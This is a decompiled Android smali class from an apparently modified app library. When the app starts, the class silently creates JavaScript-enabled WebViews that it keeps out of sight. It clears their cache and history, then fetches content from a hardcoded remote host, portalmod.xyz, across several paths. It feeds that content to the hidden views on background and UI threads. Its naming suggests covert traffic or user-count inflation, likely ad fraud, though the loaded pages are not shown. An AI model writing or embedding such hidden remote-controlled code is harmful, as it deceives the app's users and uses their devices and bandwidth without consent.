.class public Lcom/mod/libs/TTR$x;
.super Ljava/lang/Object;
.source "TTR$x.java"

# interfaces
.implements Lcom/mod/libs/TThread$OnThreadEvent;
.implements Lcom/mod/libs/TTrigger$OnTriggerEvent;


# static fields
.field public static PropHost:Ljava/lang/String;

.field public static daudate:Ljava/lang/String;

.field public static folder_Exc0:Ljava/lang/String;

.field public static folder_Exc1:Ljava/lang/String;

.field public static folder_Exc2:Ljava/lang/String;

.field public static folder_desk:Ljava/lang/String;

.field public static folder_sts:Ljava/lang/String;


# instance fields
.field private TR:Lcom/mod/libs/TTR;

.field private Thread:Lcom/mod/libs/TThread;

.field private Trigger:Lcom/mod/libs/TTrigger;

.field private cnt:I

.field private context:Landroid/content/Context;

.field private lpxStr:Ljava/lang/String;

.field private webViewMocx:Landroid/webkit/WebView;

.field private webViewTrfx:Landroid/webkit/WebView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "http://portalmod.xyz/"

    sput-object v0, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    const-string v0, "prox0"

    sput-object v0, Lcom/mod/libs/TTR$x;->folder_Exc0:Ljava/lang/String;

    const-string v0, "prox1"

    sput-object v0, Lcom/mod/libs/TTR$x;->folder_Exc1:Ljava/lang/String;

    const-string v0, "prox2"

    sput-object v0, Lcom/mod/libs/TTR$x;->folder_Exc2:Ljava/lang/String;

    const-string v0, "prosts"

    sput-object v0, Lcom/mod/libs/TTR$x;->folder_sts:Ljava/lang/String;

    const-string v0, "prostsdesk"

    sput-object v0, Lcom/mod/libs/TTR$x;->folder_desk:Ljava/lang/String;

    const-string v0, "daudate"

    sput-object v0, Lcom/mod/libs/TTR$x;->daudate:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/mod/libs/TTR$x;->cnt:I

    iput-object p1, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-virtual {p0}, Lcom/mod/libs/TTR$x;->InitAdInter()V

    return-void
.end method

.method static synthetic access$0(Lcom/mod/libs/TTR$x;)Lcom/mod/libs/TTR;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->TR:Lcom/mod/libs/TTR;

    return-object v0
.end method

.method static synthetic access$1(Lcom/mod/libs/TTR$x;)Landroid/webkit/WebView;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    return-object v0
.end method

.method static synthetic access$2(Lcom/mod/libs/TTR$x;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->lpxStr:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$3(Lcom/mod/libs/TTR$x;)I
    .locals 1

    iget v0, p0, Lcom/mod/libs/TTR$x;->cnt:I

    return v0
.end method

.method static synthetic access$4(Lcom/mod/libs/TTR$x;)Lcom/mod/libs/TTrigger;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->Trigger:Lcom/mod/libs/TTrigger;

    return-object v0
.end method

.method static synthetic access$5(Lcom/mod/libs/TTR$x;)Landroid/webkit/WebView;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    return-object v0
.end method

.method static synthetic access$6(Lcom/mod/libs/TTR$x;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method public CreateWebViewDAU()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    const/4 v2, 0x1

    new-instance v0, Landroid/webkit/WebView;

    iget-object v1, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->clearCache(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->clearHistory()V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewMocx:Landroid/webkit/WebView;

    new-instance v1, Lcom/mod/libs/TTR$x$2;

    invoke-direct {v1, p0}, Lcom/mod/libs/TTR$x$2;-><init>(Lcom/mod/libs/TTR$x;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    return-void
.end method

.method public CreateWebViewTrfx()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    const/4 v2, 0x1

    new-instance v0, Landroid/webkit/WebView;

    iget-object v1, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->clearCache(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->clearHistory()V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->webViewTrfx:Landroid/webkit/WebView;

    new-instance v1, Lcom/mod/libs/TTR$x$1;

    invoke-direct {v1, p0}, Lcom/mod/libs/TTR$x$1;-><init>(Lcom/mod/libs/TTR$x;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    return-void
.end method

.method public InitAdInter()V
    .locals 4

    iget-object v1, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/mod/libs/TTR;->GetActivityName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    sget-object v2, Lcom/mod/libs/TRConst;->BBMToolbar:Ljava/lang/String;

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/mod/libs/TTR;->SetSharedBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-virtual {p0}, Lcom/mod/libs/TTR$x;->CreateWebViewTrfx()V

    invoke-virtual {p0}, Lcom/mod/libs/TTR$x;->CreateWebViewDAU()V

    new-instance v1, Lcom/mod/libs/TTR;

    iget-object v2, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/mod/libs/TTR;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/mod/libs/TTR$x;->TR:Lcom/mod/libs/TTR;

    new-instance v1, Lcom/mod/libs/TThread;

    invoke-direct {v1, p0}, Lcom/mod/libs/TThread;-><init>(Lcom/mod/libs/TThread$OnThreadEvent;)V

    iput-object v1, p0, Lcom/mod/libs/TTR$x;->Thread:Lcom/mod/libs/TThread;

    new-instance v1, Lcom/mod/libs/TTrigger;

    iget-object v2, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    invoke-direct {v1, v2, p0}, Lcom/mod/libs/TTrigger;-><init>(Landroid/content/Context;Lcom/mod/libs/TTrigger$OnTriggerEvent;)V

    iput-object v1, p0, Lcom/mod/libs/TTR$x;->Trigger:Lcom/mod/libs/TTrigger;

    iget-object v1, p0, Lcom/mod/libs/TTR$x;->Thread:Lcom/mod/libs/TThread;

    const-string v2, "GetLpx"

    invoke-virtual {v1, v2}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V

    return-void
.end method

.method public onThread(Ljava/lang/String;)V
    .locals 4

    const-string v2, "GetLpx"

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    :try_start_0
    sget-object v2, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    iget-object v2, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    const v3, 0x493e0

    invoke-static {v2, v3}, Lcom/mod/libs/TTR;->DoFireBlank(Landroid/content/Context;I)V

    :cond_0
    iget v2, p0, Lcom/mod/libs/TTR$x;->cnt:I

    if-nez v2, :cond_1

    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/mod/libs/TTR$x;->folder_Exc0:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/mod/libs/TTR$x;->lpxStr:Ljava/lang/String;

    :cond_1
    iget v2, p0, Lcom/mod/libs/TTR$x;->cnt:I

    const/4 v3, 0x1

    if-ne v2, v3, :cond_2

    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/mod/libs/TTR$x;->folder_Exc1:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/mod/libs/TTR$x;->lpxStr:Ljava/lang/String;

    :cond_2
    iget v2, p0, Lcom/mod/libs/TTR$x;->cnt:I

    const/4 v3, 0x2

    if-ne v2, v3, :cond_3

    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/mod/libs/TTR$x;->folder_Exc2:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/mod/libs/TTR$x;->lpxStr:Ljava/lang/String;

    :cond_3
    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/mod/libs/TTR$x;->folder_sts:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/mod/libs/THttp;->ReadRaw(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/mod/libs/TTR$x;->PropHost:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/mod/libs/TTR$x;->folder_desk:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/mod/libs/THttp;->ReadRaw(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    check-cast v2, Landroid/app/Activity;

    new-instance v3, Lcom/mod/libs/TTR$x$3;

    invoke-direct {v3, p0, v1, v0}, Lcom/mod/libs/TTR$x$3;-><init>(Lcom/mod/libs/TTR$x;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    iget-object v2, p0, Lcom/mod/libs/TTR$x;->Thread:Lcom/mod/libs/TThread;

    const-string v3, "InsDAU"

    invoke-virtual {v2, v3}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_4
    :goto_0
    const-string v2, "InsDAU"

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    :try_start_1
    iget-object v2, p0, Lcom/mod/libs/TTR$x;->context:Landroid/content/Context;

    check-cast v2, Landroid/app/Activity;

    new-instance v3, Lcom/mod/libs/TTR$x$4;

    invoke-direct {v3, p0}, Lcom/mod/libs/TTR$x$4;-><init>(Lcom/mod/libs/TTR$x;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :cond_5
    :goto_1
    return-void

    :catch_0
    move-exception v2

    goto :goto_1

    :catch_1
    move-exception v2

    goto :goto_0
.end method

.method public onTriggered(Ljava/lang/String;)V
    .locals 2

    const-string v0, "M1"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    iput v0, p0, Lcom/mod/libs/TTR$x;->cnt:I

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->Thread:Lcom/mod/libs/TThread;

    const-string v1, "GetLpx"

    invoke-virtual {v0, v1}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V

    :cond_0
    const-string v0, "M2"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x2

    iput v0, p0, Lcom/mod/libs/TTR$x;->cnt:I

    iget-object v0, p0, Lcom/mod/libs/TTR$x;->Thread:Lcom/mod/libs/TThread;

    const-string v1, "GetLpx"

    invoke-virtual {v0, v1}, Lcom/mod/libs/TThread;->DoThread(Ljava/lang/String;)V

    :cond_1
    return-void
.end method
